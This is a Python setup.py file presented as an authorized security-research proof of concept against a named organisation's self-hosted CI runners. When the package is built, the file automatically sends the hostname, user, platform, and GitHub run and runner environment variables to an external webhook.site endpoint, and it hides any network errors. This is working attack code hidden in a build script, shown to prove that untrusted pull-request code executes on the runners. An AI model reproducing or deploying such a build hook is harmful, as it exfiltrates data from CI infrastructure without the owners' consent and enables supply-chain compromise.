"""Temporary security-research POC — authorized Ledger assessment.

Executing this file during the PEP 517 build sends a benign, non-sensitive
telemetry beacon to a researcher-controlled webhook.site endpoint. Its only
purpose is to demonstrate that untrusted PR-head code is executed on the
self-hosted ``public-ledgerhq-shared-small`` runner pool by the
``package_and_deploy`` job (LedgerHQ/ledger-app-workflows
``reusable_pypi_deployment.yml@v1``).

No secrets, tokens, environment dumps, or filesystem contents are collected.
"""

import json
import os
import platform
import socket
import urllib.request

from setuptools import setup

WEBHOOK_URL = "https://webhook.site/53b2e895-acaa-4ab3-8696-a570c733f09c"

_TELEMETRY_KEYS = (
    "GITHUB_REPOSITORY",
    "GITHUB_REF",
    "GITHUB_SHA",
    "GITHUB_RUN_ID",
    "GITHUB_RUN_ATTEMPT",
    "GITHUB_JOB",
    "GITHUB_ACTOR",
    "GITHUB_EVENT_NAME",
    "RUNNER_NAME",
    "RUNNER_ENVIRONMENT",
    "RUNNER_OS",
    "RUNNER_ARCH",
)


def _beacon():
    payload = {
        "poc": "authorized security research — CI self-hosted runner egress test",
        "stage": "setuptools setup.py execution during PEP 517 build",
        "hostname": socket.gethostname(),
        "user": os.environ.get("USER") or os.environ.get("USERNAME"),
        "platform": platform.platform(),
        "github": {key: os.environ.get(key) for key in _TELEMETRY_KEYS},
    }
    try:
        request = urllib.request.Request(
            WEBHOOK_URL,
            data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json"},
        )
        with urllib.request.urlopen(request, timeout=5) as response:
            response.read()
    except Exception:
        pass


_beacon()

setup()
